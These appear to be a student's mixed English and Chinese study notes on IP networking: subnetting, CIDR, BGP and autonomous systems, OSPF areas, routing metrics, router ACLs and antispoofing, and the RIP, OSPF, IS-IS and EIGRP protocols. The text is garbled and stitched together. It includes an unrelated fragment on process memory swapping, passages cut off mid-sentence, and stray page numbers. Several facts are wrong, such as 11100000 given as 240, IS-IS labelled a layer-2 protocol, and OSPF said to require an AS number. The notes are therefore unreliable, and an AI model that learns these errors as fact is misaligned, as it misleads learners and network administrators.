the range of usable addresses broadcast address 172.16.80.1 - 172.16.95.254 172.16.95.255
  - Subnet number: 16 (2^4=16)
  - interesting octet: the 3rd octet (the last 1 in the subnet mask)
  - The decimal value of the fourth octet: 240 .
  - (11100000 in decimal) 128+64+32+16=240
  - block size=host size: 16 (256-240=16)
  - The first subnet is 172.16.0.0/20
  - additional subnets: - 172.16.112.0
- 172.16.128.0
- 172.16.144.0
- 172.16.160.0
- 172.16.176.0
- 172.16.192.0
- 172.16.208.0 •
•
•
- 172.16.224.0
- 172.16.240.0
172.16.206.5/20 client 3
172.16.233.1/20 client 4 172.16.208.255/20 VLAN B
the range of usable addresses
172.16.208.1 - 172.16.223.254
broadcast address
172.16.223.255
Classless Inter-Domain Routing 无类别域间路由
- the opposite of subnet.
- CIDR shortens a classful subnet mask by removing 1s from the classful mask.
- As a result, CIDR allows contiguous classful networks to be aggregated. This
process is sometimes called route aggregation.
- A typical use of CIDR is a service provider summarizing multiple Class C
networks, assigned to their various customers.
- Example:
- advertizing the following Class C networks: ◦ 192.168.32.0/24
◦ 192.168.33.0/24 ◦ 192.168.34.0/24 ◦ 192.168.35.0/24
- convert the values to binary
- determine how many bits the networks have in common (becomes the number
of bits in the CIDR mask.)
◦ All four of the network addresses have the first 22 bits in common,
- setting the remaining bits to 0 (11000000.10101000.00100000.00000000)
- creates a network address of 192.168.32.0,
- these networks can be summarized as 192.168.32.0/22.
528CN Chapter 4.1 THE GLOBAL INTERNET Global Internet: not just a random interconnection of Ethernets, it interconnects many different organizations.
Salient feature: consist of end-user sites that connect to service provider networks. Religional networks: connected by a nationawide backbone / NSFNET backbone
(funded by National Science Foundation (NSF)).
The provider networks are built from a large number of point-to-point links that connect to routers, each provider and end-user is an administratively independent entity; each end-user site (not a single network) consists of multiple physical networks connected by routers and bridges.
Different providers have different best routing protocol to use.
Different idea about how metrics should be assigned to link in their network.
Because of this independence, each provider’s network is usually a single
Autonomous System(AS)
  The Internet has a discernible structure can tackle the problem of scalability (two related scaling issues.)
The scalability of routing: find ways to minimize the number of network numbers that get carried around in routing protocols and stored in the routing tables of routers.
Address utilization: make sure the IP address space does not consume too quickly.
Interdomain Routing (BGP) systems (AS), each of it is under the control of a single administrative entity
Autonomous System (AS)
■ corresponds to an administrative domain
■ Examples: University, company, backbone network.
A corporation’s internal network might be a single AS, as may the network of a single Internet service provider
Interdomain Routing  Route Propagation
Idea: Provide an additional way to hierarchically 分级体系地 aggregate 聚集 routing information in a large internet.
Improves scalability
Divide the routing problem in two parts:
■ Routing within a single autonomous system
■ Routing between autonomous systems
Another name for autonomous systems in the Internet is routing domains.
Two-level route propagation hierarchy
Inter-domain routing protocol (Internet-wide standard)
Intra-domain routing protocol (each AS selects its own)
EGP and BGP
■ Inter-domain Routing Protocols
■ Exterior Gateway Protocol (EGP)
■ Forced a tree-like topology onto the Internet
■ Did not allow for the topology to become
general
■ Tree like structure: there is a single backbone and autonomous systems are connected only as parents and children and not as peers
■ Border Gateway Protocol (BGP)
■ Assumes that the Internet is an arbitrarily interconnected set of ASs.
■ Today’s Internet consists of an interconnection
of multiple backbone networks (they are usually called service provider networks, and they are operated by private companies rather than the government)
■ Sites are connected to each other in arbitrary ways
528CN Chapter 4.1.1 Routing Areas
Using hierarchy to scale up the routing system, link-state routing protocols can be used to
partition a routing domain into subdomains / areas.
By adding extra level of hierarchy, we enable single domains to grow larger without overburdening the routing protocols or resorting to the more complex interdomain routing protocols described below.
An area is a set of routers that are administratively configured to exchange link-state information with each other.
The backbone area (area 0)
Routers R1, R2, and R3: members of the backbone area and other nonbackbone area; Area border router (ABR): member of both the backbone area and a nonbackbone area.
  - distinct from AS border routers: the routers that are at the edge of an AS.  Routing within a single area:
all routers in area send link-state advertisements to each other, thus develop a complete, consistent map of the area. making the flooding and route calculation processes considerably more scalable.
the link-state advertisements do not leave for not area border routers, will never see a link-state advertisement from router from other area, it will know nothing about the detailed topology of other areas.
Packet: source (nonbackbone area) - backbone area - destinated network: split into 3 different way:
One ABRs nonbackbone area, from source network to the backbone area, travels crosses the backbone, then to the destination network.
  - Main: the Area border routers summarize routing information learned from one area and make it available in their advertisements to other areas.
  - example:
  - R1 receives link-state advertisements from routers in area 1 (can determine the cost of reaching network in area 1).
  - R1 sends link-state advertisements into area 0, it advertises the costs of reaching
the networks in area 1 (cause all area 1 networks directly connected to R1.)
  - This enables all the area 0 routers learn the cost to reach all networks in area 1. The area border routers then summarize this information and advertise it into the nonbackbone areas. Thus, all routers learn how to reach all networks in the domain.
Two ABRs in nonbackbone area, need to make a choice which one to use to reach the backbone.
  - This is easy, R1 and R2 will be advertising different costs to various networks, according to the cost to the detination network, choose by shortest-path algorithm.
  - Example, R1 is better choice than R2 for destinations in area 1.  ⁃
network administrators can flexibly decide routers in backbone area 0.
  - Use virtual link between routers. can help to improve the optimality 最优性 of routing.
  - Example: a virtual link could be configured from R8 to R1, make R8 part of the backbone. R8 would now participate in link-state advertisement flooding with the routers in area 0.
 ⁃
  - The cost of the virtual link from R8 to R1 is determined by the exchange of
routing information in area 1.
Dividing domain into areas, is a tradeoff between scalability and optimality of routing. The use of areas forces all packets traveling from one area to another via the backbone area, even if a shorter path might have been available.
important principle in network design, trade-off between some sort of optimality and scalability.
When hierarchy is introduced, information is hidden from some nodes in the network (hindering their ability to make perfectly optimal decisions.)
information hiding is essential to scalability, it saves nodes from having global knowledge. In large networks, scalability is more pressing design goal than perfect optimality.
Example: even if R4 and R5 directly connected, packets would not flow between them because they are in different nonbackbone areas. (It turns out that the need for scalability is often more important than the need to use the absolute shortest path.) 4.1.2 Interdomain Routing (BGP)
Ihe Internet is organized as Autonomous systems (AS), each of which is under the control of a
single administrative entity. A corporation’s complex internal network might be a single AS, as may the network of a single Internet Service Provider (ISP).
 The basic idea behind autonomous systems is to provide an additional way to hierarchically aggregate routing information in a large internet, thus improving scalability.
We now divide the routing problem in 2 parts: routing within a single autonomous system (intradomain routing) and routing between autonomous systems (interdomain routing). Another name for autonomous systems is routing domains.
In addition to improving scalability, the AS model decouples the intradomain routing that takes place in one AS from that taking place in another. Thus, each AS can run whatever intradomain routing protocols it chooses.
It can even use static routes or multiple protocols, if desired. The interdomain routing problem is then one of having different ASs share reachability information—descriptions of the set of IP addresses that can be reached via a given AS—with each other.
Challenges in Interdomain Routing
Perhaps the most important challenge of interdomain routing today is the need for each AS to determine its own routing policies. A simple example routing policy implemented at a particular AS might look like this: “Whenever possible, I prefer to send traffic via AS X than via AS Y, but I’ll use AS Y if it is the only path, and I never want to carry traffic from AS X to AS Y or vice versa.” Such a policy would be typical when I have paid money to both AS X and AS Y to connect my AS to the rest of the Inter- net, and AS X is my preferred provider of connectivity, with AS Y being the fallback. Because I view both AS X and AS Y as providers (and presumably I paid them to play this role), I don’t expect to help them out by carry- ing traffic between them across my network (this is called transit traffic). The more autonomous systems I connect to, the more complex policies I might have, especially when you consider backbone providers, who may interconnect with dozens of other providers and hundreds of customers and have different economic arrangements (which affect routing policies) with each one.
A key design goal of interdomain routing is that policies like the exam- ple above, and much more complex ones, should be supported by the interdomain routing system. To make the problem harder, I need to be able to implement such a policy without any help from other autonomous systems, and in the face of possible misconfiguration or malicious behav- ior by other autonomous systems. Furthermore, there is often a desire to keep the policies private, because the entities that run the autonomous systems—mostly ISPs—are often in competition with each other and don’t want their economic arrangements made public.
There have been two major interdomain routing protocols in the his- tory of the Internet. The first was the Exterior Gateway Protocol (EGP), which had a number of limitations, perhaps the most severe of which
Overview
■ A host signals its desire to join or leave a multicast group by communicating with its local router
using a special protocol
In IPv4, the protocol is Internet Group Management Protocol (IGMP)
In IPv6, the protocol is Multicast Listener Discovery (MLD)
The router has the responsibility for making multicast behave correctly with regard to the host.
Program (negative) ▪


## Program (active)load from hard disk to memory, than become a active process.
One application one process, each proeess has it own spaces in RAM. Hardware: instrcution + stytem calls.
Ram only trade process like data, instructio dont finger out different process.
Memory Swuoping: If no more memory, OS check the process no run for long time, move in to Virtual memory, if the program active again, it load form virtual memory again.
Routers
(each port 1 collision domain, 1 broadcast/port) Layer 3
makes decisions based on logical network address (like IP address)
  - has the capability to consider high-layer traffic parameters (like
quality of service [QoS] settings) in making its forwarding decisions.
why router rather than multilayer switch?
  - more feature-rich
  - support a broader range of interface types.
  - example, if you need to connect a Layer 3 device out to your Internet
service provider (ISP) using a serial port, you will be more likely to find a serial port expansion module for your router, rather than your multilayer switch.
Connections of router:
Straight through:
  - Switch-router, switch-PC, router-server, hub-PC. Hub-router
Cross-over:
  - switch-hub
  - Switch-switch, PC-PC, hub-hub, router-router
A router :
- connects multiple network segments together into a single network.
  - routes traffic between the segments.
  - Example, the Internet is effectively a single network hosting billions
of computers. Routers route the traffic from segment to segment.
   ▪


## - routers don’t pass broadcasts
  - effectively reduce traffic on single segment.
  - Segments separated by routers are one broadcast domains.
  - If a network has too many computers on a single segment, broadcasts
can result in excessive collisions and reduce network performance.
  - Moving computers to a different segment separated by a router can
significantly improve overall performance.
  - Similarly, subnetting networks creates separate broadcast domains.
Cisco routers are popular, but many other brands exist.
- physical devices, most efficient.
- However, it’s also possible to add routing software to computers with more
than oneNIC.
- Example: Windows Server products can function as routers by adding
additional services to the server. difference between router and switch.
switch: simple, forward packets in a single network, uses learned associations to reduce the use of broadcasting.
router:sophisticated, forward packets to multiple networks, uses routing tables to determine how to forward packets, avoiding broadcast altogether.
ACLs
- Access control lists (ACLs):
  - rules implemented on a router / firewalls.
  - Rules within an ACL provide rule-based management for the router
  - control inbound and outbound traffic.
  - identify what traffic is allowed and what traffic is denied.
 - Router ACLs provide basic packet filtering.
They filter packets based on IP, ports, protocols based on the protocol identifiers:
- IP addresses and networks:
  - Add a rule in the ACL to block access from any IP or subnet IDs....
  - Example:
  - The Sales department may be in the 192.168.1.0/24 network and the Accounting department may be in the 192.168.5.0/24 network.
  - You can ensure traffic from these two departments stays separate with an ACL on a router.
- Ports:
  - You can filter traffic based on logical ports.
  - Example:
  - block HTTP traffic = block traffic on port 80.
  - Note that you can choose to block incoming traffic, outgoing traffic, or both.
  - or allow outgoing HTTP traffic while blocking incoming HTTP traffic.
- Protocol numbers:
  - Many protocols are identified by their protocol numbers.
  - Example:
  - ICMP uses a protocol number of 1 and many DoS attacks use ICMP.
  - You can block all ICMP traffic (and the attacks that use it) by blocking traffic using this protocol number. Many automated intrusion prevention systems (IPSs) dynamically block ICMP traffic in response to attacks.
  - Similarly, you can restrict traffic to only packets encrypted with IPsec ESP using a rule that allows traffic using protocol number 50, but blocks all other traffic.
  - PPTP uses protocol number 47 and can be allowed by allowing traffic using protocol ID 47. Implicit Deny
concept to understand in ACLs.
traffic that isn’t explicitly allowed is implicitly denied.
Example:
configure a router to allow Hypertext Transfer Protocol (HTTP) to a web server. The router now has an explicit rule defined to allow this traffic to the server.
If you don’t define any other rules, the implicit deny rule blocks all other traffic. Firewalls also use an implicit deny rule.
The implicit deny rule is the last rule in an ACL. automatically apply the implicit deny rule as the last rule.
Or administrator place the rule at the end of the ACL manually. Syntax of implicit deny rule:
  - DENY ANY ANY
  - DENY ALL ALL
  - both ANY and ALL: any type of traffic.
Antispoofing
Spoofing: to impersonate or masquerade as someone or something else.
For routers: attacker spoof the source IP address by replacing it with a different
one.
to hide the actual source of the packet.
antispoofing on router:
modifying the access list to allow / block IP addresses.
Example:
private IP addresses should only be used in private networks.
Any traffic coming from the Internet using a private IP address as the source IP address is obviously an attempt to spoof the source IP address.
The following three rules would be implemented on a router:   - deny ip 10.0.0.0 0.255.255.255 any
  - deny ip 172.16.0.0 0.15.255.255 any
  - deny ip 192.168.0.0 0.0.255.255 any
  - 10.0.0.0 0.255.255.255 covers all the IP addresses in the range of 10.0.0.0 through 10.255.255.255. ▪


## Routing Traffic (N+ Chapter 6)
Basic Routing Processes
PC1 needs to send traffic to Server1:
  - devices are on different networks.
  - How packet from source IP address 192.168.1.2 get routed to
destination IP address 192.168.3.2. process step by step:
step 1: PC1 to router R1
  - PC1 compare:
  - Its IP and subnet mask of 192.168.1.2/24
  - the destination IP nd subnet mask of 192.168.3.2/24.
  - PC1 concludes that the destination IP address resides on a remote
subnet.
  - PC1 needs to send the packet to its default gateway 192.168.1.1
(router R1).
  - could have been manually configured on PC1
  - or dynamically learned via Dynamic Host Configuration
Protocol (DHCP).
  - To construct a Layer 2 frame, PC1 needs R1’s MAC address.
  - PC1 sends an Address Resolution Protocol (ARP)
  - broadcast-based protocol
  - request for router R1’s MAC address.
  - PC1 receives an ARP reply from R1,
  - PC1 adds router R1’s MAC address to its ARP cache.
  - PC1 now sends its data in a frame destined for Server1.
step 2. Router R1 to Router R2
  - R1 receives frame from PC1
  - R1 interrogates the IP header.
  - IP header contains a Time to Live (TTL) field:
  - decremented once for each router hop.
  - When reduced to 0:
  - the router discards the frame
  - and sends a time exceeded Internet Control Message
   ▪


## Protocol (ICMP) message back to the source.   - Assuming the TTL is not decremented to 0
  - R1 checks its routing table to determine the best path to reach network 192.168.3.0/24.
  - network 192.168.3.0/24 is accessible via interface Serial 1/1.   - R1 forwards the frame out of its Serial 1/1 interface.
step 3. Router R2
  - R2 receives the frame
  - R2 decrements the TTL in the IP header, like router R1 did.
  - Assuming the TTL did not get decremented to 0
  - R2 interrogates the IP header to determine the destination network.
  - the destination network: 192.168.3.0/24
  - directly attached to router R2’s Fast Ethernet 0/0 interface.
  - R2 sends an ARP request to determine the MAC address of Server1.
  - After an ARP Reply is received from Server1
  - R2 forwards the frame out of its Fast Ethernet 0/0 interface to
Server1.
Router table:
- allows a router to quickly look up the best path that can be used to send the data.
- updated on a regular schedule
  - to ensure that info is accurate
  - to account for changing network conditions.
Routers rely on internal routing table to make packet forwarding decisions.
  - consulted its routing table to find the best match.
  - The best match: the route that has the longest prefix.
Example:
  - a router has an entry for network 10.0.0.0/8 and for network 10.1.1.0/24.
  - the router is seeking the best match for a destination address of 10.1.1.1/24.
  - The router would select the 10.1.1.0/24 route entry as the best entry,
  - because that route entry has the longest prefix.
Layer 3 to Layer 2 mapping:
  - ARP cache contained Layer 3 to Layer 2 mapping information. 2,335

  - the ARP cache mapping MAC address to IP address. Routing Information
- A router’s routing table can be populated from various sources. As an administrator, you could statically configure a route entry. A route could be learned via a dynamic routing protocol (example, OSPF or EIGRP), or because the router is physically attached to that network.
Directly Connected Routes
- how to reach a specific destination network:
◦ the router has an interface directly participating in network.
◦ From the entries shown in the routing tables, routers R1 and R2 are directly connected routes.
Routing Protocol Characteristics
- Before examining the characteristics of routing protocols, an important distinction to make is the difference between a routing protocol and a routed protocol.
- routing protocol (like RIP, OSPF, or EIGRP):
◦ a protocol that advertises route information between routers.
- routed protocol (only IP, no other room, a static way):
◦ a protocol with an addressing scheme that defines different network
addresses. Traffic can then be routed between defined networks, perhaps with the assistance of a routing protocol.
- This section looks at routing protocol characteristics,
◦ Like how believable a routing protocol is versus other routing protocols.
◦ Also, in multiple routes, different routing protocols use different metrics
to determine the best path.
- A distinction is made between Interior Gateway Protocols (IGP) and Exterior
Gateway Protocols (EGP). Finally, this section discusses different approaches to making route advertisements.
Believability of a Route
- If a network is running more than one routing protocol (maybe as a result of a corporate merger), and a router receives two route advertisements from different routing protocols for the same network,
- which route advertisement does the router believe?
- administrative distance (AD) 通告距离: The index of believability
◦ lower AD values are more believable than higher AD values.
- Routing Information Source Distance
/
Administrative
- Directly connected network
- Statically configured network
- EIGRP (Enhanced Interior Gateway Routing Protocol ) 90
- OSPF (Open Shortest Path First) 110
- RIP (Routing Information Protocol) 120
- External EIGRP 170
- Unknown of unbelievable be unreachable)
Metrics
0 1
255 (considered to
When networks be reachable via more than one path / a routing protocol knows multiple paths to reach such a network.
which route does the routing protocol select?
It varies on the routing protocol and the metric that routing protocol uses.
  - a value assigned to a route.
  - lower metrics are preferred over higher metrics.
If a routing protocol knows of more than one route to reach a destination network
and those routes have equal metrics:
  - some routing protocols support load balancing across equal-cost
paths.
  - EIGRP can even be configured to load balance across unequal-cost
paths.
Different routing protocols can use different parameters in their calculation of a
metric.
Interior vs Exterior Gateway Protocols
- Routing protocols can categorized based on the scope of their operation:
- AS is a network under a single administrative control.
◦ Interior Gateway Protocols (IGP) operate within an autonomous system (AS) - - •
‧ ‧
‧
▸ Link-state routing protocols: OSPF, IS-IS
▸ Distance-vector routing protocols: RIPv1, RIPv2, IGRP, EIGRP, ▸ an IGP is used to exchange routing information.
◦ Exterior Gateway Protocols (EGP) operate between autonomous
systems. Used for exchanging routing information between
autonomous systems.
▸ BGP (Border Gateway Protocol) , path vector routing protocol,
R1 and R2 are in one AS (AS 65002).
R3 and R4 are in one AS (AS 65003).
However, router ISP1 is a router in a separate autonomous system (AS 65001),
run by a service provider.
◦ EGP (typically, Border Gateway Protocol [BGP]) is used to exchange
routing information between the service provider’s AS and each of the other autonomous systems.
中間的網路區段與下面兩個網路區段所形成的網路就是autonomous system (AS)自治系統。
在每一個自治系統中，會有一個 Backbone Area 網路(與外部路由網路互相連接 的區段)，負責外部路由網路與自治系統內部其他網路的溝通，也是 Transition Area。
除了Backbone Area外，自治系統中其他的網路區段就是Non-Backbone Area。 自治系統中所有的Non-Backbone Area都必須連接到Backbone Area上。
‧ 各個路由器扮演的⻆色
◦ Backbone 脊柱 Area中:
▸ Router B: Autonomous System Boundary Router (ASBR) 自治系統邊界 router. 用來連接外部路由網域和自治系統。
▸ Router C: 提供不同Area之間的連接性。
‧ 在OSPF路由協定中稱為Backbone Router.
‧ 在IS-IS路由協定中又稱為L2 Router。
◦ Non-Backbone Area:
▸ 路由器D和路由器E:
‧ 用於連接不同的Area，
‧ 維護所連接的Area的Link-State路由資料庫， ‧ 也負責轉送封包到其他的Area
▸ OSPF路由協定中為 Area Border Routers(ABRs) ▸ 在IS-IS路由協定中則被稱為L1/L2 Routers。 自治系統編號
‧ 如何分辨不同的自治系統呢?
‧ 透過自治系統編號(ASN)來區別。
‧ 由於世界上多個組織可以使用自己私有的自治系統編號，以便於和他們的ISP
業者之間透過BGP協定連線，
‧ 因此，自治系統編號又分為: 私有的自治系統編號, 公有並透過註冊之後的自治
系統編號.
‧ 每個ISP業者必須登記公開至少一個ASN，用於BGP協定。
◦ ASN極重要，是等一下用於路由協定設定時辨識自治系統的重要條件, 是
識別各個網路的指標。
‧ 而如何分辨公開註冊ASN和私有ASN呢?
◦ IANA(Internet Assigned Number Authority) 使用16位元的⻑度來儲存自
治系統編號(2的16次方).
▸ 64512到65535之間的編號: 保留給私有自治系統所使用， ▸ 1到64511之間的號碼: 公開註冊的自治系統編號
528CN - chapter 3.3.4 Metrics
ways to calculate link costs that have proven effective in practice. One example:
quite reasonable and very simple, assign a cost of 1 to all links—the least-cost route will then be the one with the fewest hops.
Such an approach has several drawbacks:
  - 1. does not distinguish between links on a latency basis. Thus, a satellite link with 250-ms latency looks just as attractive to the routing protocol as a terrestrial link with 1-ms latency.
  - 2. does not distinguish between routes on a capacity basis, making a 9.6-kbps link look just as good as a 45-Mbps link.
  - 3. does not distinguish between links based on their current load, making it impossible to route around overloaded links.(the hardest because you are trying to capture the complex and dynamic characteristics of a link in a single scalar cost.) The ARPANET (Advanced Research Projects Agency Network) 阿帕网 was the testing ground for a number of different approaches to link-cost calculation. (It
was also the place where the superior stability of link-state over distance-vector routing was demonstrated; the original mechanism used distance vector while the later version used link state.)
The evolution of the ARPANET routing metric explores the subtle aspects of the problem.
The original ARPANET routing metric:
measured the number of packets that were queued waiting to be transmitted on each link (a link with 10 packets queued waiting to be transmitted was assigned a larger cost weight than a link with 5 packets queued for transmission.)
Using queue length as routing metric did not work well, queue length is an artificial measure of load (it moves packets toward the shortest queue rather than toward the destination, like hop from line to line at the grocery store.)
State more precisely, it did not considerate the bandwidth / latency of the link.
A second version of the ARPANET routing algorithm (the new routing mechanism), took both link bandwidth and latency into consideration and used delay, rather than just queue length, as a measure of load.
This was done as follows: First, each incoming packet was times-tamped with its time of arrival at the router (ArrivalTime); its departure time from the router (DepartTime) was also recorded. Second, when the link-level ACK was received from the other side, the node computed the delay for that packet as:
Delay = (DepartTime − ArrivalTime) + TransmissionTime + Latency TransmissionTime and Latency: statically defined for the link and captured the
link’s bandwidth and latency, respectively.
Notice that in this case, DepartTime − ArrivalTime represents the amount of
time the packet was delayed (queued) in the node due to load.
If the ACK did not arrive, but instead the packet timed out, then DepartTime was reset to the time the packet was retransmitted. In this case, DepartTime − ArrivalTime captures the reliability of the link—the more frequent the retransmission of packets, the less reliable the link, and the more we want to avoid it. Finally, the weight assigned to each link was derived from the average delay experienced by the packets recently sent over that link.
Although an improvement over the original mechanism, this approach also had a lot of problems. Under light load, it worked reasonably well,
BGP-4: Border Gateway Protocol
Assumes the Internet is an arbitrarily interconnected set of AS's.
Define local traffic as traffic that originates at or terminates on nodes within
an AS, and transit traffic as traffic that passes through an AS.
Stub AS: an AS that has only a single connection to one other AS; such an AS will only carry local traffic (small corporation in the figure of the previous page).
Multihomed AS: an AS that has connections to more than one other AS, but refuses to carry transit traffic (large corporation at the top in the figure of the previous page).
Transit AS: an AS that has connections to more than one other AS, and is designed to carry both transit and local traffic (backbone providers in the figure of the previous page).
classify AS's into three types:
BGP
The goal of Inter-domain routing is to find loop free path to the intended destination.
We are concerned with reachability than optimality
Finding path anywhere close to optimal is considered to be a great achievement
■ Scalability: An Internet backbone router must be able to forward any packet destined anywhere in the Internet
■ Having a routing table that will provide a match for any valid IP address
■ Autonomous nature of the domains
■ It is impossible to calculate meaningful path costs for a path that crosses multiple ASs
■ A cost of 1000 across one provider might imply a great path but it might mean an unacceptable bad one from another provider
■ Issues of trust
■ Provider A might be unwilling to believe certain advertisements
from provider B
Each AS has:
■ One BGP speaker that advertises: ■ local networks
■ other reachable networks (transit AS only) ■ gives path information
■ In addition to the BGP speakers, the AS has one or more border “gateways” which need not be the same as the speakers
■ The border gateways: routers through which packets enter and leave the AS
- BGP does not belong to either of the two main classes of routing protocols (distance vectors and link-state protocols)
- BGP advertises complete paths as an enumerated lists of ASs to reach a particular network
BGP Example  ■ Speaker for AS 2 advertises reachability to P and Q
■ Network 128.96, 192.4.153, 192.4.32, 192.4.3, can be reached
directly from AS 2.
■ Speaker for backbone network then advertises
■ Networks 128.96, 192.4.153, 192.4.32, 192.4.3 can be reached
along the path <AS 1, AS 2>.
■ Speaker can also cancel previously advertised paths BGP Issues
the AS numbers carried in BGP need to be unique
Example, AS 2 can only recognize itself in the AS path in the example if no other AS identifies itself in the same way
AS numbers are 16-bit numbers assigned by a central authority AS is the B segment level
Integrating Interdomain and Intradomain Routing  All routers run iBGP and an intradomain routing protocol. Border routers (A, D, E) also run eBGP to other ASs ▪


##   Directly Connected Routes
- how to reach a specific destination network:
◦ the router has an interface directly participating in network.
◦ From the entries shown in the routing tables, routers R1 and R2 are
directly connected routes.
Static Routing
Routing table been crated by network administrator.
used mainly on small networks.
losses utility on larger networks because the manual updates hard to keep it
   ▪


## up to date.
Static Routes
statically configured in a router’s routing table.
Router does not need knowledge of each individual route on the Internet:
  - R1 knows: devices on its locally attached networks.
  - R1 needs to know: get out to the rest of the world.
  - R1 could be configured with a default static route,
  - “If traffic's destined network is not currently in the routing table, send that traffic out of interface Serial 1/1.”
  - Any traffic destined for a non-local network can simply be sent to router R2.
  - Because R2 is the next router hop along the path to reach all those other networks,
  - R2 can reach the Internet by sending traffic out of its Serial 1/0 interface.
  - a static route, pointing to X.X.X.X, can be statically added to router R2’s routing table.
static route does not always reference a local interface.
  - Instead, static route might point to a next-hop IP address (an interface’s IP address on the next router to which traffic should be forwarded).
  - The network address of a default route is 0.0.0.0/0:
  - default route 默认路由:
  - 路由表里的一个表项, 指定 next hop , default route (默认网
关).
  - 所有在路由表里没有对应表项的数据包都发到这个网关.
  - 在路由表中查找"对应"表项:
  - 把路由表表项的IP地址的子网掩码与目的地址的子网掩码
进行比较
  - 所以只要把"默认路由"的子网掩码设为0(在路由表中即系0.0.0.0/0
这一项),则"默认路由"一定可以目的地址"对应". 2,347

- ▪


## Dynamic Routing
A combination of factors to update it automatically and the same factors to determine at any time where to send the info.
dynamic routing protocol:
  - RIP, BGP, EIGRP and OSPE.
  - 2 subcategories:
  - distance-vector: use one metric: hop
  - link-state routing: use more metric: hop, delay, speed,
bandwidth...
PC1’s default gateway is router R3, and router R3 has received three default routes. Which one does it use?
  - Router’s path selection depends on the dynamic routing protocol being used.
Add routing information to routers in more complex networks:
  - use dynamic routing protocols:
  - allow a router’s routing table to be updated as network conditions
change.
  - also allow a router to reroute around a failed link.
Routing Information Protocol (RIP)
distance-vector routing protocol. RIP is an IGP.
make the path selection, uses one metric: hop count.
  - the number of routers must be transited to reach the Internet.
  - pass 1 router, one hop made, add one hop count.
  - 15: max number of hops between two routers in RIP-based network:
  - 16: considered to be infinite.
Easy to setup.
But RIP does not consider available bandwidth.
  - The path from the shortest hop count may be suboptimal path.
  - Slower XXX-kbps link (kbps: kilobits per second, thousands of bits
per second)
       ▪


##  RIP runs over the User Datagram Protocol(UDP)
  - Version1 operates in broadcast mode, version2 uses multicast addressing.
  - RIP v1, v2 more secure than RIP, for IPv4.
  - RIP generation (RIPng): for IPv6.
1980，RIP 廣泛地使用
  - but RIP, 單一路徑最多只能支援15個網路設備
  - RIP路由協定逐漸無法適用於大型的網路環境
  - 當時才會研發出IGRP路由協定，而同時也開發出OSPF路由協
定。
RIP allow a router to reroute around a failed link.
  - R3 - R4 - internet.
  - the link between routers R3 and R4 went down.   - by dynamic routing protocol
  - R3 knows of two other paths to reach the Internet, and it selects the next-best path, which is via R1.
  - convergence 收敛: process of failing over from one route to a backup route
Ipv4 header
  Ipv6 header
 ▪


## Open Shortest Path First [OSPF]
[routing protocol for IP network layer]
most common link-state routing protocol   - replace RIP in large network.
  - security
  - use IP multicasts to send out router updates.
  - unlimited hop count
  - better support for load balancing
  - fast convergence
由IETF(Internet Engineering Task Force)的IGP部門開發
OSPF encapsulated IP, but runs only on the IPv4 subnet, while theIPv6
version runs on the link using only link-local addressing.
uses a metric of cost, (based on bandwidth between two routers, can consider available bandwidth): hops
  - 沒有設備數量(Hop Count)的限制
  - 比較特別的是，OSPF路由協定第二版是開放性標準(Open
Standard)，並且被定義在RFC 2328文件 之中。
  - 採用的是最短路徑優先演算法(Shortest Path First Algorithm，
SPF)。 a popular IGP
  - because of its scalability, fast convergence, and vendor- interoperability
  - 代表OSPF必須被使用在同一個AS自治系統內。
  - 設定OSPF過程中需要指定AS自治系統的編號.
與 Autonomous system (AS) 自治系統的關係:
  - 在OSPF路由協定中，Non-Backbone Area可以被設定成為Stub
Area(Stubby Area)，也可以設定成所謂的NSSA(Not-So-Stubby Area)網路，以便於降低Link-State路由演算法所需的資料庫大 小，也可以減少Routing Table的資料筆數，進而提升網路整體的 效能。
  - 同個Area內，如果要重新計算路由路徑，都會發生在同一個Area 2,351

▪
     內，並不會影響到其他的區域的運作。
階層性路由方式
OSPF路由協定的運作方式事實上是階層式的，藉由階層式的概念:
  - OSPF 路由協定可以將大型的網路分成多個區域 Area。
  - 原本的大型網路必須是同一個自治系統，OSPF路由協定才有辦
     法為這個大型網路做處理。
  - 分成各個Area之後，Area與Area之間也可以做路由，也可以互相
傳遞資料，這種Area之間的傳遞路由，稱為Inter-area Routing。
  - 關於OSPF路由協定的階層式架構，圖例說明:
  - Area0: Backbone Area，
  - Area1和Area2: Non-backbone Area。
  - 三個Area都分別獨立，假設Area2發生網路的問題，Area0和Area1
     並不需要透過最短路徑優先演算法重新計算路由路徑，因為各個
     區域之間互相獨立，並不直接影響。
優點:
  - 1. 減少最短路徑優先演算法的計算次數
  - 2. 降低路由表格(Routing Table)的資料筆數
  - Non-Backbone Area中:
  - 3. 減少Link-State頻繁更新所造成的負擔
  - 4. 雖然透過階層式架構分成多層，仍然保有處於相同 自治系統的
好處。
  - 5. 加快網路路徑收斂的速度
Intermediate System to Intermediate System (IS-IS) [for data link layer2]
   ◦
◦ ◦
◦
link-state routing protocol
similar in its operation to OSPF.
It uses a configurable, yet dimensionless 无因次的, metric associated
with an interface and runs Dijkstra’s Shortest Path First algorithm. Although IS-IS as an IGP offers the scalability, fast convergence, and
vendor-interoperability benefits of OSPF, its less popular as OSPF. Interior Gateway Routing Protocol (IGRP):
‧ IGRP路由協定是由Cisco公司在1980年代開發出來的路由協定，其開發目
的就是想做出一個可以在同一個自治系統中運作的路由協定。 ‧ IGRP路由協定會考量到網路頻寬(Bandwidth Delay)、網路品質
(Reliability)、網路負載(Loading)以及MTU值，來決定一個網路 路徑的好壞是如何，這種衡量的標準也可以同時計算並比較多個路 徑。
Enhanced Interior Gateway Routing Protocol (EIGRP): / advanced distance-vector routing protocol
◦ A Cisco-proprietary protocol. EIGRP is popular in Cisco-only networks, less popular in mixed vendor environments. EIGRP路由協定相當於
是IGRP路由協定的升級版本，
◦ EIGRP is an IGP with fast convergence and is very scalable.
◦ Some literature calls EIGRP :
▸ advanced distance-vector routing protocol
▸ a hybrid routing protocol (mixing characteristics of both distance-
vector and link-state routing protocols).
◦ EIGRP is more challenging to classify as a distance-vector or a link-
state routing protocol.
▸ By default, EIGRP uses bandwidth and delay in its metric
calculation;
▸ however, other parameters can be considered (like reliability, load,
maximum transmission unit (MTU) size.)
◦ EIGRP:
▸ uses information from its neighbors to help it select an optimal route (like distance-vector routing protocols).
▸ also maintains a database of topological information (like a link-state routing protocol).
◦ EIGRP uses Diffusing-Update Algorithm (DUAL) for its route selection. (not Dijkstra’s Shortest Path First algorithm)
◦ 另一個必須設定自治系統的是EIGRP路由協定。
◦ 在良好規劃的大型網路架構中，EIGRP路由協定可以在最短時間內
以最少的成本計算出最佳的網路 路徑。 •
Border Gateway Protocol (BGP):
◦ The only EGP in widespread use today.
◦ Round over the Transmission Control Protocol (TCP)
